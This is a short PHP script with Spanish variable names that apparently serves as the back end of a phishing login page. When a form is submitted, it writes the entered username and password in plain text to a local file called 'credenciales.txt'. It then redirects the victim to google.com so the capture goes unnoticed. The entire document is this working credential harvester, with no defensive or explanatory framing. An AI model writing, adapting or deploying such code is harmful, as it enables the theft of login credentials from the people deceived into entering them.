<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST["usuario"];
    $contrasena = $_POST["contrasena"];
    
    $archivo = fopen("credenciales.txt", "a");
    fwrite($archivo, "Usuario: $usuario - Contraseña: $contrasena\n");
    fclose($archivo);
    
    header("Location: https://www.google.com");
    exit();
}
?>